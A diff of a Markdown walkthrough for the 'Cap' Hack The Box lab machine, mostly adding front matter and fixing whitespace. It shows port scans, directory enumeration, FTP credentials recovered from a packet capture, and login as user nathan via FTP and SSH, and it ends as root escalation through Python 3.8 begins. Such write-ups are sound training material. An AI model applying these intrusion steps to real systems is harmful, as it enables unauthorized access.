@@ -1,3 +1,8 @@
+---
+title: "Cap-HTB"
+published: 2025-11-06
+---
+
 # Cap
 
 # Target :
@@ -15,7 +20,7 @@ PORT   STATE SERVICE REASON         VERSION
 21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
 
 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
 | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0=
 |   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
@@ -25,7 +30,7 @@ PORT   STATE SERVICE REASON         VERSION
 
 80/tcp open  http    syn-ack ttl 63 Gunicorn
 |_http-server-header: gunicorn
-| http-methods: 
+| http-methods:
 |_  Supported Methods: OPTIONS HEAD GET
 |_http-title: Security Dashboard
 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
@@ -66,13 +71,13 @@ PORT      STATE         SERVICE      VERSION
 <aside>
 💡
 
-Password-Based Authentication is not safe in SSH 
+Password-Based Authentication is not safe in SSH
 
 </aside>
 
 ```python
-ssh root@cap.htb 
-    
+ssh root@cap.htb
+
 The authenticity of host 'cap.htb (10.10.10.245)' can't be established.
 ED25519 key fingerprint is SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI.
 This key is not known by any other names.
@@ -91,7 +96,7 @@ dirsearch -u http://cap.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3
 
 Target: http://cap.htb/
 
-[00:56:40] Starting: 
+[00:56:40] Starting:
 [00:56:42] 302 -  208B  - /data  ->  http://cap.htb/
 [00:56:45] 200 -   17KB - /ip
 [00:56:58] 200 -   35KB - /netstat
@@ -100,59 +105,52 @@ Target: http://cap.htb/
 
 ## FTP ( 21 ) :
 
-![image.png](Cap/image.png)
+![FTP Login Success](./Cap/image.png)
 
 - Downloaded Capture files from the Web-server running on `PORT : 80`
-- Inspected the `.pcap`  files and found Interesting thing to look into.
-- searched for `FTP`  and got the user and password for `FTP`  Logon.
-    
+- Inspected the `.pcap` files and found Interesting thing to look into.
+- searched for `FTP` and got the user and password for `FTP` Logon.
     ```python
-    nathan : Buck3tH4TF0RM3!
+        nathan : Buck3tH4TF0RM3!
     ```
-    
     ```python
-    ftp nathan@cap.htb
-    
-    Connected to cap.htb.
-    220 (vsFTPd 3.0.3)
-    331 Please specify the password.
-    Password: 
-    230 Login successful.
-    Remote system type is UNIX.
-    Using binary mode to transfer files.
-    ftp> ls
-    229 Entering Extended Passive Mode (|||59674|)
-    150 Here comes the directory listing.
-    -r--------    1 1001     1001           33 Oct 06 19:35 user.txt
-    226 Directory send OK.
+        ftp nathan@cap.htb
+
+        Connected to cap.htb.
+        220 (vsFTPd 3.0.3)
+        331 Please specify the password.
+        Password:
+        230 Login successful.
+        Remote system type is UNIX.
+        Using binary mode to transfer files.
+        ftp> ls
+        229 Entering Extended Passive Mode (|||59674|)
+        150 Here comes the directory listing.
+        -r--------    1 1001     1001           33 Oct 06 19:35 user.txt
+        226 Directory send OK.
     ```
-    
-- Tried to login to `SSH`  with the same Credentials and LOL 😅!! got the `SSH`  of the user `nathan` .
-    
+- Tried to login to `SSH` with the same Credentials and LOL 😅!! got the `SSH` of the user `nathan` .
     ```python
-    nathan@cap:~$ id
-    uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
+        nathan@cap:~$ id
+        uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
     ```
-    
-- In this `python 3.8`   version was used in the system ( through `Linpeas.sh` )
-- Checked the user of the `python 3.8`  version
-    
+- In this `python 3.8` version was used in the system ( through `Linpeas.sh` )
+- Checked the user of the `python 3.8` version
     ```python
     ls -la /usr/bin/python3.8
     -rwxr-xr-x 1 root root 5486384 Jan 27  2021 /usr/bin/python3.8
     ```
-    
 - Got it ! the owner of it is root
 - We can use it for `Post-exploitation`
 
 # Post-Exploitation :
 
-- Exploited `Python 3.8`  to get the `ROOT` user.
+- Exploited `Python 3.8` to get the `ROOT` user.
 
 ```python
 python3
 
-Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
+Python 3.8.5 (default, Jan 27 2021, 15:41:15)
 [GCC 9.3.0] on linux
 Type "help", "copyright", "credits" or "license" for more information.
 
